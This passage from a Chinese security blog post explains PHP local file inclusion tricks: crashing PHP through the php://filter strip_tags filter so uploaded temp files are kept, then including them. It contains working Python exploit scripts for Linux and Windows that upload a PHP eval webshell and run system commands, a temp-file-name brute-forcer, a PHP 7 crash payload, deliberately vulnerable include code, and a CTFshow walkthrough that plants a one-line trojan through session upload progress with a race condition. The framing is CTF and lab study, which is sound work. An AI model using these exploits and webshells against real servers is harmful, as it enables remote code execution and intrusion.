+<p>php代码中<strong>使用php://filter的过滤器<code>strip_tags</code> , 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除</strong>而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。</p>
+<p>注：官方在PHP Version 7.0.28时已经修复该漏洞</p>
+<h4 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> Payload</h4>
+<p>更具漏洞分析构造可利用的payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.33.6.145/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>这种包含会导致php执行过程中出现segment fault，此时上传文件，临时文件会被保存在<code>upload_tmp_dir</code>所指定的目录下，不会被删除，这样就能达成getshell的目的。</p>
+<h4 id="代码环境"><a class="markdownIt-Anchor" href="#代码环境"></a> 代码环境</h4>
+<p><strong>测试代码</strong></p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>dir.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$a</span>));</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
+<p><strong>测试环境</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Version 7.0.9</span><br></pre></td></tr></table></figure>
+<p><img src="../images/t01a330620896b3cd5c.png" alt="img" /></p>
+<h4 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h4>
+<p><strong>攻击载荷</strong></p>
+<p>string.strip_tags过滤器导致出现php segment fault</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://filter/string.strip_tags/resource=index.php</span><br></pre></td></tr></table></figure>
+<p><img src="../images/t013523944235c9f89d.png" alt="img" /></p>
+<p>可以看到上面这种包含会导致php执行过程中出现错误，此时上传文件，临时文件会被保存在<code>upload_tmp_dir</code>所指定的目录下，从而不会被删除，一直存储在服务的临时目录里面。</p>
+<p><strong>攻击利用-技巧1</strong></p>
+<p>我们可以通过<code>dir.php</code>辅助查找生成的临时文件</p>
+<p><strong>编写 Linux Exp</strong></p>
+<p>Linux网络攻击环境下的脚本编写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python version 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">&#x27;&lt;?php eval($_REQUEST[Qftm]);&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">url1 = <span class="string">&#x27;http://192.168.68.119/index.php?file=php://filter/string.strip_tags/resource=index.php&#x27;</span></span><br><span class="line">r = requests.post(url=url1, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">url2 = <span class="string">&#x27;http://192.168.68.119/dir.php?dir=/tmp/&#x27;</span></span><br><span class="line">r = requests.get(url2)</span><br><span class="line">data = re.search(<span class="string">r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;</span>, r.content).group(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"><span class="built_in">print</span> data</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"></span><br><span class="line">url3=<span class="string">&#x27;http://192.168.68.119/index.php?file=/tmp/&#x27;</span>+data</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;Qftm&#x27;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r =  requests.post(url=url3,data=data)</span><br><span class="line"><span class="built_in">print</span> r.content</span><br></pre></td></tr></table></figure>
+<p><strong>编写 Windows Exp</strong></p>
+<p>windows网络攻击环境下的脚本编写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python version 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">&#x27;&lt;?php eval($_REQUEST[Qftm]);&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">url1 = <span class="string">&#x27;http://192.168.68.119/web/fi/index.php?file=php://filter/string.strip_tags/resource=index.php&#x27;</span></span><br><span class="line">r = requests.post(url=url1, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">url2 = <span class="string">&#x27;http://192.168.68.119/web/fi/dir.php?dir=C:/Windows/&#x27;</span></span><br><span class="line">r = requests.get(url2)</span><br><span class="line">data = re.search(<span class="string">r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;</span>, r.content).group(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"><span class="built_in">print</span> data</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"></span><br><span class="line">url3=<span class="string">&#x27;http://192.168.68.119/web/fi/index.php?file=C:/Windows/&#x27;</span>+data+<span class="string">&#x27;.tmp&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;Qftm&#x27;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r =  requests.post(url=url3,data=data)</span><br><span class="line"><span class="built_in">print</span> r.content</span><br></pre></td></tr></table></figure>
+<p><strong>系统EXP利用</strong></p>
+<p>针对不同的系统环境运行脚本就可以RCE拿到任意代码执行</p>
+<p><img src="../images/t013499c43603f5729c.png" alt="img" /></p>
+<p>然后查看服务器上恶意临时文件，确实存在未被删除！！</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span><span class="number">.68</span><span class="number">.119</span>/web/fi/dir.php?file=C:<span class="regexp">/Windows/</span></span><br></pre></td></tr></table></figure>
+<p><img src="../images/t012912d8076af5977e.png" alt="img" /></p>
+<p><strong>攻击利用-技巧2</strong></p>
+<p><strong>暴力破解</strong></p>
+<p>假如没有<code>dir.php</code>还能利用吗，答案是可以的，因为我们传入的恶意文件没有被删除，这样我们就可以爆破这个文件的文件名。</p>
+<p>在上面的讲述中，我们知道不同的系统默认的临时文件存储路径和方式都不一样</p>
+<ul>
+<li>Linux</li>
+</ul>
+<p>Linux临时文件主要存储在<code>/tmp/</code>目录下，格式通常是（<code>/tmp/php[6个随机字符]</code>）</p>
+<ul>
+<li>windows</li>
+</ul>
+<p>Windows临时文件主要存储在<code>C:/Windows/</code>目录下，格式通常是（<code>C:/Windows/php[4个随机字符].tmp</code>）</p>
+<p>对比Linux和Windows来看，Windows需要破解的位数比Linux少，从而Windows会比Linux破解速度快，位数越长所需要耗费的时间就越大。</p>
+<p><strong>攻击载荷</strong></p>
+<p>编写临时文件生成和暴力破解攻击载荷</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python version 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">&#x27;&lt;?php eval($_REQUEST[Qftm]);&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">url1 = <span class="string">&#x27;http://192.168.68.119/web/fi/index.php?file=php://filter/string.strip_tags/resource=index.php&#x27;</span></span><br><span class="line">r = requests.post(url=url1, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">########################暴力破解模块########################</span></span><br><span class="line">url2=<span class="string">&#x27;http://192.168.68.119/web/fi/index.php?file=C:/Windows/php&#x27;</span>+&#123;fuzz&#125;+<span class="string">&#x27;.tmp&amp;Qftm=system(&#x27;</span>whoami<span class="string">&#x27;);&#x27;</span></span><br><span class="line">data = fuzz</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"><span class="built_in">print</span> data</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"><span class="comment">########################暴力破解模块########################</span></span><br></pre></td></tr></table></figure>
+<p>对于暴力破解模块，可以自己添加多线程模块进行暴力破解，也可以将暴力破解模块拿出来单独进行fuzz，或者比较常用的做法就是将一些fuzz工具的模块拿出来添加到里面稍微改一下接口就可以直接使用。</p>
+<p>推荐使用fuzz工具直接进行fuzz测试，fuzz工具一般都包含多线程、自定义字典等，使用起来很方便，不用花费时间去编写调试代码。</p>
+<p>推荐几款好用的Fuzz工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">基于Go开发：gobuster     https://github.com/OJ/gobuster</span><br><span class="line">基于Java开发：dirbuster  OWASP杰出工具 kali自带</span><br><span class="line">基于Python开发：wfuzz    https://github.com/xmendez/wfuzz</span><br></pre></td></tr></table></figure>
+<h4 id="爆破临时文件名exp"><a class="markdownIt-Anchor" href="#爆破临时文件名exp"></a> 爆破临时文件名exp</h4>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">base_url=<span class="string">&quot;http://192.168.211.146/lfi.php&quot;</span></span><br><span class="line">parameter=<span class="string">&quot;file&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> charset:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> charset:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> charset:</span><br><span class="line">                        filename = i + j + k + l + m + n</span><br><span class="line">                        url = base_url+<span class="string">&quot;?&quot;</span>+parameter+<span class="string">&quot;=/tmp/php&quot;</span>+filename</span><br><span class="line">                        <span class="built_in">print</span> url</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            response = requests.get(url)</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                                <span class="built_in">print</span> <span class="string">&quot;[+] Include success!&quot;</span></span><br><span class="line">                                <span class="built_in">print</span> <span class="string">&quot;url:&quot;</span>+url</span><br><span class="line">                                exit()</span><br><span class="line">                        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                            <span class="built_in">print</span> e</span><br></pre></td></tr></table></figure>
+<h4 id="php7-老版本通杀"><a class="markdownIt-Anchor" href="#php7-老版本通杀"></a> <strong>php7 老版本通杀</strong></h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>
+<p><img src="../images/EnhdZ4.png" alt="EnhdZ4.png" /></p>
+<h2 id="利用-session-上传进度"><a class="markdownIt-Anchor" href="#利用-session-上传进度"></a> 利用 Session 上传进度</h2>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13795170.html">利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含 - NPFS - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/u49948530/maczpr/mzqvr95xyb1ful9k">SESSION_UPLOAD_PROGRESS 的利用</a></p>
+<p><strong>原理</strong>：</p>
+<ul>
+<li>PHP支持 session 上传进度记录</li>
+<li>会将数据保存在 session 文件中，路径一般是 <code>/var/lib/php/sessions/sess_XXXXXX</code></li>
+<li>如果你能构造带有 PHP 代码的 progress 字段内容，就可以通过包含 session 来 RCE！</li>
+</ul>
+<p><img src="../images/1999159-20201010194658099-100509760.png" alt="img" /></p>
+<p>我们可以利用<code>session.upload_progress</code>将木马写入session文件，然后包含这个session文件。不过前提是我们需要传上去一个session文件，并且知道session文件的存放位置。</p>
+<p>session里有一个默认选项，<strong>session.use_strict_mode</strong>默认值为off。</p>
+<p><img src="../images/1999159-20201010195459494-303350987.png" alt="img" /></p>
+<p>此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值.</p>
+<p>注：在Linux系统中，session文件一般的默认存储位置为 /tmp 或 /var/lib/php/session</p>
+<p>但是<strong>session.upload_progress.cleanup</strong>默认是开启的</p>
+<p><img src="../images/1999159-20201010195935484-1603129676.png" alt="img" /></p>
+<p>框着的这句话意思就是说<strong>在默认情况下，session.upload_progress.cleanup是开启的，一旦读取了所有POST数据，它就会清除进度信息</strong></p>
+<p>这里我们可以利用条件竞争来进行文件上传</p>
+<p>CTFshow 里web入门里的一个文件包含题</p>
+<p><img src="../images/1999159-20201010203352916-1787825804.png" alt="img" /></p>
+<p>通过观察代码，可以看到过滤了大部分的文件包含函数，这里我们<strong>利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争</strong>进行文件包含</p>
+<p>以POST的形式发包，传的文件随意</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://e113b1bc-28b8-4f08-9e60-b74fe3a96ef3.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>抓包，这里我们添加一个 <code>Cookie :PHPSESSID=flag</code> ，PHP将会在服务器上创建一个文件：<code>/tmp/sess_flag</code>” （这里我们猜测session文件默认存储位置为/tmp），并在<code>PHP_SESSION_UPLOAD_PROGRESS</code>下添加一句话木马，修改如下</p>
+<p><img src="../images/1999159-20201011101000761-1649541695.png" alt="img" /></p>
+<p>因为我们在上面这个页面添加的ID值是flag，所以传参<code>?file=/tmp/sess_flag</code></p>
+<p>修改如下：这个a是随便加的，主要是为了方便爆破</p>
+<p><img src="../images/1999159-20201010204012871-1202434485.png" alt="img" /></p>
+<p>条件竞争，将POST和GET的包都开启爆破，即可得到目录，</p>
+<p><img src="../images/1999159-20201011101006139-1700977622.png" alt="img" /></p>
+<p>可以看到有fl0g.php，只要把ls改为 cat fl0g.php即可，修改如下：</p>
+<p><img src="../images/1999159-20201010203400391-335990203.png" alt="img" /></p>
+<p>爆破即可得到flag</p>
+<p><img src="../images/1999159-20201010203406645-571446662.png" alt="img" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="ez include" class="lazyload">
+        
+        <a href="/2025/05/08/ez%20include/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            ez include
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/1755142834147175514283467.jpg" data-sizes="auto" alt="享受世界，快乐为先" class="lazyload">
+        
+      
+      <a href="/2025/05/07/%E4%BA%AB%E5%8F%97%E4%B8%96%E7%95%8C%EF%BC%8C%E5%BF%AB%E4%B9%90%E4%B8%BA%E5%85%88/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          享受世界，快乐为先
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.</span> <span class="toc-text"> Data伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.</span> <span class="toc-text"> 本地文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-number">2.1.</span> <span class="toc-text"> 敏感文件路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text"> 伪协议读文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#00-%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.1.</span> <span class="toc-text"> %00 截断文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.2.</span> <span class="toc-text"> 路径长度截断文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%82%B9%E5%8F%B7%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.3.</span> <span class="toc-text"> 点号截断文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A3%B8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABpearcmdphp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%86%99%E5%85%A5shell"><span class="toc-number">2.3.</span> <span class="toc-text"> 裸文件包含(pearcmd.php文件包含写入shell)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.3.1.</span> <span class="toc-text"> 利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.3.2.</span> <span class="toc-text"> 例题：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.</span> <span class="toc-text"> 日志文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.1.</span> <span class="toc-text"> 中间件日志文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-2"><span class="toc-number">2.4.1.1.</span> <span class="toc-text"> 例题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.2.</span> <span class="toc-text"> ssh 日志文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.5.</span> <span class="toc-text"> session 文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.6.</span> <span class="toc-text"> 临时文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nginx%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABshell"><span class="toc-number">3.</span> <span class="toc-text"> nginx缓存文件包含shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6"><span class="toc-number">3.1.</span> <span class="toc-text"> Nginx缓存机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%97%B6%E9%97%B4%E7%AA%97%E5%8F%A3"><span class="toc-number">3.2.</span> <span class="toc-text"> 关键时间窗口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">3.3.</span> <span class="toc-text"> EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-lfi%E5%88%A9%E7%94%A8%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6getshell-%E5%A7%BF%E5%8A%BF"><span class="toc-number">4.</span> <span class="toc-text"> PHP LFI利用临时文件Getshell 姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E6%9C%BA%E5%88%B6"><span class="toc-number">4.1.</span> <span class="toc-text"> 临时文件机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">4.1.1.</span> <span class="toc-text"> 全局变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E7%9B%AE%E5%BD%95"><span class="toc-number">4.1.2.</span> <span class="toc-text"> 存储目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99"><span class="toc-number">4.1.3.</span> <span class="toc-text"> 命名规则</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpinfo%E7%89%B9%E6%80%A7"><span class="toc-number">4.2.</span> <span class="toc-text"> PHPINFO特性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="toc-number">4.2.1.</span> <span class="toc-text"> 测试代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 